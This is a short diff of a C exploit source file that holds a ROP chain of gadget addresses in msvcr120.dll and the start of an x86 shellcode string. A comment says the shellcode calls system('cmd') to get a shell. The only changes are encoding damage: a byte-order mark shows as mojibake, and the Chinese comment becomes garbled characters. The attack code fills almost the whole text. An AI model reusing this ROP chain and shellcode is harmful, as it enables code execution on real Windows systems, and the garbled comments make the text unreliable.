@@ -1,4 +1,4 @@
-int rop_chain[] = {
+锘縤nt rop_chain[] = {
 	// [msvcr120.dll] base = 0x5a580000
 	0x5a58ed02, // # pop ebp # ret [msvcr120.dll]
 	0x5a58ed02, // # skip 4 bytes [msvcr120.dll]
@@ -22,7 +22,7 @@ int rop_chain_len = sizeof(rop_chain);
 
 /**
  * shellcode:
- * 调用msvcr120.dll中的system("cmd")获得shell
+ * 璋冪敤msvcr120.dll涓殑system("cmd")鑾峰緱shell
  */
 char *shellcode =
 	"\xe8\xff\xff\xff\xff\xc2\x59\x90\x33\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x58"
